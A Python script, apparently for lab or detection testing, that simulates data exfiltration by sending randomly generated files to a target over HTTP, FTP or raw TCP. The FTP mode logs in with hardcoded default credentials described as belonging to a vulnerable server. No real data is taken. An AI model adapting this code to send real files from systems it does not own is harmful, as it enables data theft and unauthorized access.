#!/usr/bin/env python3

import argparse
import requests
import socket
import time
import os
import random
import string

def generate_random_data(size_kb):
    """Generate random data of specified size in kilobytes"""
    chars = string.ascii_letters + string.digits
    data = ''.join(random.choice(chars) for _ in range(size_kb * 1024))
    return data

def exfil_via_http(target, port, file_size_kb, num_files):
    """Simulate data exfiltration over HTTP"""
    print(f"Starting HTTP exfiltration to {target}:{port}")
    url = f"http://{target}:{port}/index.php"
    
    for i in range(num_files):
        try:
            data = generate_random_data(file_size_kb)
            payload = {'data': data, 'filename': f'exfil_{i}.txt'}
            
            print(f"Sending file {i+1}/{num_files} ({file_size_kb} KB)")
            response = requests.post(url, data=payload)
            print(f"Response: {response.status_code}")
            
            # Add small delay to avoid overwhelming the network
            time.sleep(0.5)
        except Exception as e:
            print(f"Error during HTTP exfiltration: {e}")
    
    print("HTTP exfiltration complete")

def exfil_via_ftp(target, port, file_size_kb, num_files):
    """Simulate data exfiltration over FTP"""
    from ftplib import FTP
    
    print(f"Starting FTP exfiltration to {target}:{port}")
    
    try:
        # Connect to FTP server
        ftp = FTP()
        ftp.connect(target, port)
        ftp.login("ftpuser", "password")  # Using default credentials from the vulnerable server
        print("FTP Login successful")
        
        # Create a temporary directory for exfiltrated files
        temp_dir = "/tmp/exfil"
        if not os.path.exists(temp_dir):
            os.makedirs(temp_dir)
        
        # Generate and upload files
        for i in range(num_files):
            filename = f"{temp_dir}/exfil_{i}.txt"
            
            # Generate random data and write to file
            data = generate_random_data(file_size_kb)
            with open(filename, 'w') as f:
                f.write(data)
            
            # Upload the file
            print(f"Uploading file {i+1}/{num_files} ({file_size_kb} KB)")
            with open(filename, 'rb') as file:
                ftp.storbinary(f"STOR exfil_{i}.txt", file)
            
            # Add small delay
            time.sleep(0.5)
        
        # Cleanup and close connection
        ftp.quit()
        print("FTP exfiltration complete")
    
    except Exception as e:
        print(f"Error during FTP exfiltration: {e}")

def exfil_via_custom_tcp(target, port, file_size_kb, num_files):
    """Simulate data exfiltration over custom TCP connection"""
    print(f"Starting custom TCP exfiltration to {target}:{port}")
    
    for i in range(num_files):
        try:
            # Create socket
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((target, port))
            
            # Generate and send data
            data = generate_random_data(file_size_kb)
            print(f"Sending file {i+1}/{num_files} ({file_size_kb} KB)")
            s.sendall(data.encode())
            
            # Close socket
            s.close()
            time.sleep(0.5)
        
        except Exception as e:
            print(f"Error during custom TCP exfiltration: {e}")
    
    print("Custom TCP exfiltration complete")

def main():
    parser = argparse.ArgumentParser(description="Data Exfiltration Simulator")
    parser.add_argument("target", help="Target IP address or hostname")
    parser.add_argument("-p", "--port", type=int, default=80, help="Target port")
    parser.add_argument("-m", "--mode", choices=['http', 'ftp', 'tcp'], default='http',
                        help="Exfiltration mode (http, ftp, or tcp)")
    parser.add_argument("-s", "--size", type=int, default=100,
                        help="Size of each exfiltrated file in KB")
    parser.add_argument("-n", "--num-files", type=int, default=5,
                        help="Number of files to exfiltrate")
    
    args = parser.parse_args()
    
    print(f"Data Exfiltration Simulation - Mode: {args.mode}")
    print(f"Target: {args.target}:{args.port}")
    print(f"Exfiltrating {args.num_files} files of {args.size} KB each")
    
    # Select exfiltration method based on mode
    if args.mode == 'http':
        exfil_via_http(args.target, args.port, args.size, args.num_files)
    elif args.mode == 'ftp':
        exfil_via_ftp(args.target, args.port, args.size, args.num_files)
    elif args.mode == 'tcp':
        exfil_via_custom_tcp(args.target, args.port, args.size, args.num_files)

if __name__ == "__main__":
    main()